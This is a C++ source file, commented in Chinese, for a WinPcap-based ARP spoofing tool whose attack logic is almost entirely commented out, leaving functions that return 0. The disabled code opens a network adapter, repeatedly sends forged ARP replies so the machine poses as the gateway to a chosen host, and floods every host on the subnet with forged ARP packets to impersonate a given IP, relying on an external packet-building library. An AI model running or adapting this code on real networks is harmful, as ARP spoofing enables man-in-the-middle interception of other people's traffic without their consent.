// AllSpoof.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "../ArpSpoof/ArpSpoofLib.h"

int Spoof()
{
	int nRet = 0;
	//struct arp_packet packet;
	//pcap_t * pHandler;
	//char errbuf[PCAP_ERRBUF_SIZE];    //错误缓冲区 
	//unsigned char gatewayMac[6] = {0};
	//unsigned char hostMac[6] = {0};
	//unsigned char localMac[6] = {0};

	//GetSelfMac(pszInterfaceName, localMac);
	//GetMac(pszGatewayIp, gatewayMac);
	//GetMac(pszHostIp, hostMac);

	///* 打开网卡 */ 
	//if((pHandler = pcap_open(pszInterfaceName, // name of the device 
	//		65536, // portion of the packet to capture 
	//		0, //open flag 
	//		1000, // read timeout 
	//		NULL, // authentication on the remote machine 
	//		errbuf // error buffer 
	//		) ) == NULL) 
	//{ 
	//	LOG_ERROR("\nUnable to open the adapter. %s is not supported by WinPcap\n",
	//		pszInterfaceName); 
	//	/* Free the device list */ 
	//	return -1; 
	//} 

	////向网关和主机分别定时发送欺骗包
	//while(1)
	//{
	//	BuildArpReply(&packet, localMac, hostMac, pszGatewayIp, pszHostIp);
	//	if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
	//	{
	//		LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
	//	}

	//	Sleep(nInterval);
	//} // 结束 while(1)

	//pcap_close(pHandler); 
	return nRet;
}


int main(int argc,char* argv[]){ 
	//pcap_if_t *alldevs;               //全部网卡列表 
	//pcap_if_t *d;                     //一个网卡 
	//int inum;                         //用户选择的网卡序号 
	//int i=0;                          //循环变量 
	//pcap_t *adhandle;                 //一个pcap实例 
	//char errbuf[PCAP_ERRBUF_SIZE];    //错误缓冲区 
	//unsigned char mac[6], dstMac[6];             //本机MAC地址 
	//struct arp_packet  packet;        //ARP包 
	//unsigned long fakeIp;             //要伪装成的IP地址 
	//pcap_addr_t *pAddr;               //网卡地址 
	//unsigned long ip;                 //IP地址 
	//unsigned long netmask;            //子网掩码 

	//if(argc!=2){ 
	//	printf("Usage: %s inet_addr\n",argv[0]); 
	//	return -1; 
	//} 

	////从参数列表获得要伪装的IP地址 
	//fakeIp = inet_addr(argv[1]); 
	//if(INADDR_NONE==fakeIp){ 
	//	fprintf(stderr,"Invalid IP: %s\n",argv[1]); 
	//	return -1; 
	//} 

	///* 获得本机网卡列表 */ 
	//if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) 
	//{ 
	//	fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf); 
	//	exit(1); 
	//} 

	///* 打印网卡列表 */ 
	//for(d=alldevs; d; d=d->next) 
	//{ 
	//	printf("%d", ++i); 
	//	if (d->description) 
	//	{
	//		printf(". description:%s\n", d->description);
	//		printf(". name:%s\n", d->name);
	//	}
	//	else 
	//		printf(". No description available\n"); 
	//} 
	////如果没有发现网卡 
	//if(i==0) 
	//{ 
	//	printf("\nNo interfaces found! Make sure WinPcap is installed.\n"); 
	//	return -1; 
	//} 
	////请用户选择一个网卡 
	//printf("Enter the interface number (1-%d):",i); 
	//scanf("%d", &inum); 

	////如果用户选择的网卡序号超出有效范围，则退出 
	//if(inum < 1 || inum > i) 
	//{ 
	//	printf("\nInterface number out of range.\n"); 
	//	/* Free the device list */ 
	//	pcap_freealldevs(alldevs); 
	//	return -1; 
	//} 

	///* 移动指针到用户选择的网卡 */ 
	//for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++); 

	//GetSelfMac(d->name, mac); //+8以去掉"rpcap://" 

	//printf("发送ARP欺骗包，本机(%.2X-%.2X-%.2X-%.2X-%.2X-%.2X) 试图伪装成%s\n", 
	//	mac[0],mac[1],mac[2],mac[3],mac[4],mac[5],argv[1]); 



	///* 打开网卡 */ 
	//if ( (adhandle= pcap_open(d->name, // name of the device 
	//	65536, // portion of the packet to capture 
	//	0, //open flag 
	//	1000, // read timeout 
	//	NULL, // authentication on the remote machine 
	//	errbuf // error buffer 
	//	) ) == NULL) 
	//{ 
	//	fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", 
	//		d->name); 
	//	/* Free the device list */ 
	//	pcap_freealldevs(alldevs); 
	//	return -1; 
	//} 

	////HexStringToCharArrary("000000000000", dstMac);
	////BuildArpReply(&packet, mac, dstMac, "192.168.1.111", "192.168.1.10");
	////if(pcap_sendpacket(adhandle, (const u_char * )&packet, 60) == -1)
	////{
	////	fprintf(stderr, "pcap_sendpacket error.\n");
	////}

	//pcap_close(adhandle);
	//for(pAddr=d->addresses; pAddr; pAddr=pAddr->next){ 
	//	//得到用户选择的网卡的一个IP地址 
	//	ip = ((struct sockaddr_in *)pAddr->addr)->sin_addr.s_addr; 
	//	//得到该IP地址对应的子网掩码 
	//	netmask = ((struct sockaddr_in *)(pAddr->netmask))->sin_addr.S_un.S_addr; 
	//	if (!ip || !netmask){ 
	//		continue; 
	//	} 
	//	//看看这个IP和要伪装的IP是否在同一个子网 
	//	if((ip&netmask)!=(fakeIp&netmask)){ 
	//		continue; //如果不在一个子网，继续遍历地址列表 
	//	} 

	//	unsigned long netsize = ntohl(~netmask); //网络中主机数
	//	unsigned long net = ip & netmask; //子网地址 

	//	for(unsigned long n=1; n<netsize; n++){ 
	//		//第i台主机的IP地址，网络字节顺序 
	//		unsigned long destIp = net | htonl(n); 
	//		//构建假的ARP请求包，达到本机伪装成给定的IP地址的目的 
	//		packet = BuildArpPacket(mac,fakeIp,destIp); 
	//		if(pcap_sendpacket(adhandle, (const u_char*)packet, 60)==-1){ 
	//			fprintf(stderr,"pcap_sendpacket error.\n"); 
	//		} 
	//	}
	//}

	return 0;
}
